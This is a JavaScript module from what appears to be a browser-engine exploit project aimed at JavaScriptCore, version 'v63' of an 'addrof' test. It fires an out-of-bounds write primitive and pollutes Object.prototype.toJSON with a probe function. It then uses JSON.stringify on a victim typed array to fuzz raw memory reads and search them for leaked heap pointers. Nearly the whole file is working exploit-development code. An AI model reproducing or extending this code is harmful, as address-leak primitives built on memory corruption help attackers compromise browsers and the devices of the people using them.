// js/script3/testArrayBufferVictimCrash.mjs (v63_AnalyzeSideChannelFuzz)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF = "OriginalHeisenbug_TypedArrayAddrof_v63_AnalyzeSideChannelFuzz";

// Variáveis globais ao módulo para captura de dados pela sonda
let captured_fuzz_reads_for_AB_v63 = null;
let captured_fuzz_reads_for_DV_v63 = null;

let leak_target_buffer_v63 = null;
let leak_target_dataview_v63 = null;
let victim_typed_array_ref_v63 = null;
let probe_call_count_v63 = 0;
let all_probe_interaction_details_v63 = []; // Coletor de detalhes de todas as chamadas da sonda
let first_call_details_object_ref_v63 = null;

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const PROBE_CALL_LIMIT_V63 = 10;
const FUZZ_OFFSETS_V63 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50];

function toJSON_TA_Probe_AnalyzeSideChannelFuzz_v63() {
    probe_call_count_v63++;
    const call_num = probe_call_count_v63;
    let current_call_details = { // Este objeto é LOCAL para cada chamada da sonda
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v63),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v63 && first_call_details_object_ref_v63 !== null),
        this_is_leak_target_AB: (this === leak_target_buffer_v63 && leak_target_buffer_v63 !== null),
        this_is_leak_target_DV: (this === leak_target_dataview_v63 && leak_target_dataview_v63 !== null),
        fuzz_capture_status: null,
        error_in_probe: null
    };
    // Logar a entrada da sonda ANTES de qualquer lógica que possa causar re-entrância se current_call_details for complexo
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1_details_obj}. IsLeakAB? ${current_call_details.this_is_leak_target_AB}. IsLeakDV? ${current_call_details.this_is_leak_target_DV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V63) {
            all_probe_interaction_details_v63.push(current_call_details); // Guarda detalhes antes de parar
            return { recursion_stopped_v63: true, call: call_num };
        }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating C1_details WITH PAYLOADS.`, "info");
            first_call_details_object_ref_v63 = current_call_details; // C1_details É current_call_details desta chamada
            if (leak_target_buffer_v63) current_call_details.payload_AB = leak_target_buffer_v63;
            if (leak_target_dataview_v63) current_call_details.payload_DV = leak_target_dataview_v63;
            // Não adicione current_call_details a si mesmo aqui para evitar auto-ref circular desnecessária no log de all_probe_interaction_details
        }
        else if (current_call_details.this_is_leak_target_AB && current_call_details.this_type === '[object ArrayBuffer]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET ArrayBuffer! Fuzzing and capturing to side-channel...`, "critical");
            let fuzzed_reads = [];
            try {
                let view = new DataView(this);
                for (const offset of FUZZ_OFFSETS_V63) {
                    if (view.byteLength < (offset + 8)) { fuzzed_reads.push({ offset: toHex(offset), error: "OOB" }); continue; }
                    let low = view.getUint32(offset, true); let high = view.getUint32(offset + 4, true);
                    let ptr = new AdvancedInt64(low, high);
                    let tb = new ArrayBuffer(8); (new Uint32Array(tb))[0]=low; (new Uint32Array(tb))[1]=high;
                    fuzzed_reads.push({ offset: toHex(offset), low:toHex(low), high:toHex(high), int64:ptr.toString(true), dbl:(new Float64Array(tb))[0] });
                }
                captured_fuzz_reads_for_AB_v63 = fuzzed_reads;
                current_call_details.fuzz_capture_status = `AB Fuzz captured ${fuzzed_reads.length} reads.`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_status}`, "vuln");
                // Log CADA leitura AGORA, ANTES de qualquer serialização do current_call_details
                fuzzed_reads.forEach(r => logS3(`    AB Fuzz @${r.offset}: L=${r.low} H=${r.high} I64=${r.int64} D=${r.dbl}${r.error ? ' E:'+r.error : ''}`, "dev_verbose"));
                all_probe_interaction_details_v63.push({...current_call_details}); // Guarda uma cópia dos detalhes
                return { marker_ab_fuzz_done_v63: true, call_num_processed: call_num };
            } catch (e) { current_call_details.error_in_probe = e.message; /* ... */ }
        }
        else if (current_call_details.this_is_leak_target_DV && current_call_details.this_type === '[object DataView]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET DataView! Fuzzing and capturing to side-channel...`, "critical");
            let fuzzed_reads = [];
            try {
                let view = this;
                for (const offset of FUZZ_OFFSETS_V63) {
                    if (view.byteLength < (offset + 8)) { fuzzed_reads.push({ offset: toHex(offset), error: "OOB" }); continue; }
                    let low = view.getUint32(offset, true); let high = view.getUint32(offset + 4, true);
                    let ptr = new AdvancedInt64(low, high);
                    let tb = new ArrayBuffer(8); (new Uint32Array(tb))[0]=low; (new Uint32Array(tb))[1]=high;
                    fuzzed_reads.push({ offset: toHex(offset), low:toHex(low), high:toHex(high), int64:ptr.toString(true), dbl:(new Float64Array(tb))[0] });
                }
                captured_fuzz_reads_for_DV_v63 = fuzzed_reads;
                current_call_details.fuzz_capture_status = `DV Fuzz captured ${fuzzed_reads.length} reads.`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_status}`, "vuln");
                fuzzed_reads.forEach(r => logS3(`    DV Fuzz @${r.offset}: L=${r.low} H=${r.high} I64=${r.int64} D=${r.dbl}${r.error ? ' E:'+r.error : ''}`, "dev_verbose"));
                all_probe_interaction_details_v63.push({...current_call_details});
                return { marker_dv_fuzz_done_v63: true, call_num_processed: call_num };
            } catch (e) { current_call_details.error_in_probe = e.message; /* ... */ }
        }
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is C1_details_obj (re-entry or unexpected). Not modifying.`, "warn");
        } else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected: ${current_call_details.this_type}.`, "warn");
        }

        // Para todos os outros casos, ou após o processamento dos casos acima que não retornaram explicitamente
        all_probe_interaction_details_v63.push({...current_call_details}); // Guarda cópia
        // Retorno genérico para evitar re-entrância indevida de objetos complexos.
        // Se for C1_details, ele já foi modificado (se o caso foi atingido).
        // Se for um objeto inesperado, apenas o marcamos.
        return (this === first_call_details_object_ref_v63) ? this : `ProcessedCall${call_num}_Type${current_call_details.this_type.replace(/[^a-zA-Z0-9]/g, '')}`;

    } catch (e_probe) {
        current_call_details.error_in_probe = e_probe.message;
        const FNAME_REF = FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF;
        logS3(`[${FNAME_REF}] Probe Call #${call_num}: CRIT ERR: ${e_probe.name} - ${e_probe.message}`, "critical", FNAME_REF);
        all_probe_interaction_details_v63.push({...current_call_details}); // Guarda cópia com erro
        return { error_marker_v63: call_num, error_msg: e_probe.message };
    }
}

export async function executeTypedArrayVictimAddrofTest_AnalyzeSideChannelFuzz() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (AnalyzeSideChannelFuzz) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF} Init...`;

    captured_fuzz_reads_for_AB_v63 = null;
    captured_fuzz_reads_for_DV_v63 = null;
    probe_call_count_v63 = 0;
    all_probe_interaction_details_v63 = []; // Resetar antes de usar
    victim_typed_array_ref_v63 = null;
    first_call_details_object_ref_v63 = null;

    leak_target_buffer_v63 = new ArrayBuffer(0x80);
    leak_target_dataview_v63 = new DataView(new ArrayBuffer(0x80));

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A";
    let stringifyOutput_parsed = null;
    let collected_probe_details_for_return = []; // Para o bug do runner

    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default (v63)" };
    let addrof_B_result = { success: false, msg: "Addrof DataView: Default (v63)" };

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);
        victim_typed_array_ref_v63 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_AnalyzeSideChannelFuzz_v63, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v63)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v63);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try { stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch (e) { /* ignora */ }

            logS3("STEP 3: Analyzing fuzz data captured in side-channels (v63)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugIndication = false;

            const process_captured_fuzz_reads = (fuzzed_reads_array, target_addrof_result, objTypeName) => {
                if (fuzzed_reads_array && Array.isArray(fuzzed_reads_array)) {
                    heisenbugIndication = true;
                    logS3(`  V63_ANALYSIS: Processing ${fuzzed_reads_array.length} captured fuzz reads for ${objTypeName}.`, "good");
                    // Os logs detalhados de cada leitura já foram feitos pela sonda.
                    // Aqui focamos em encontrar o ponteiro.
                    for (const read_attempt of fuzzed_reads_array) {
                        if (read_attempt.error) continue;
                        const highVal = parseInt(read_attempt.high, 16);
                        const lowVal = parseInt(read_attempt.low, 16);

                        // Validação de ponteiro (ajustar conforme necessário)
                        // Tentar ser mais permissivo para ver se algo aparece.
                        // Um ponteiro de heap válido geralmente não é muito pequeno e não é gigantesco.
                        // E frequentemente alinhado (ex: em 8 ou 16 bytes, então últimos bits são 0).
                        const isPotentialHeapPtr = (highVal !== 0 || lowVal > 0x10000) && // Não nulo e não muito pequeno
                                                   (highVal < 0x000F0000); // Exemplo de limite superior para heap (ajustar!)
                        const isTaggedJSCell = (JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH !== undefined &&
                                               highVal === JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH &&
                                               (lowVal & JSC_OFFSETS.JSValue.TAG_MASK) === JSC_OFFSETS.JSValue.CELL_TAG);

                        if (isPotentialHeapPtr || isTaggedJSCell) {
                            target_addrof_result.success = true;
                            target_addrof_result.msg = `V63 SUCCESS (${objTypeName} Fuzz Read): Potential Ptr ${read_attempt.int64} from offset ${read_attempt.offset}`;
                            logS3(`  !!!! V63 POTENTIAL POINTER FOUND for ${objTypeName} at offset ${read_attempt.offset}: ${read_attempt.int64} !!!!`, "vuln");
                            break;
                        }
                    }
                    if (!target_addrof_result.success) {
                        target_addrof_result.msg = `V63 Fuzzed reads for ${objTypeName} (side-channel) did not yield pointer. First read: ${fuzzed_reads_array[0]?.int64 || 'N/A'}`;
                    }
                } else if (!target_addrof_result.success) {
                     target_addrof_result.msg = `V63 No fuzz data in side-channel for ${objTypeName}.`;
                }
            };

            process_captured_fuzz_reads(captured_fuzz_reads_for_AB_v63, addrof_A_result, "ArrayBuffer");
            process_captured_fuzz_reads(captured_fuzz_reads_for_DV_v63, addrof_B_result, "DataView");

            if (!heisenbugIndication && first_call_details_object_ref_v63) {
                const c1 = first_call_details_object_ref_v63;
                if (c1.payload_AB === leak_target_buffer_v63 || c1.payload_DV === leak_target_dataview_v63) {
                    heisenbugIndication = true;
                }
            }
            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF}: Addr SUCCESS!`;
            } else if (heisenbugIndication) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF}: Heisenbug OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF}: No Heisenbug?`;
            }
        } catch (e_str_outer) { errorCapturedMain = e_str_outer; /* ... */ }
        finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_overall_main) { errorCapturedMain = e_overall_main; /* ... */ }
    finally {
        // Copiar all_probe_interaction_details_v63 ANTES de limpar para o runner
        collected_probe_details_for_return = [...all_probe_interaction_details_v63];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v63}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v63 = null;
        all_probe_interaction_details_v63 = []; // Limpa para a próxima execução
        probe_call_count_v63 = 0;
        first_call_details_object_ref_v63 = null;
        leak_target_buffer_v63 = null;
        leak_target_dataview_v63 = null;
        captured_fuzz_reads_for_AB_v63 = null;
        captured_fuzz_reads_for_DV_v63 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        stringifyResult: stringifyOutput_parsed,
        rawStringifyForAnalysis: rawStringifyOutput,
        all_probe_calls_for_analysis: collected_probe_details_for_return, // Retorna a cópia
        total_probe_calls: probe_call_count_v63,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
};
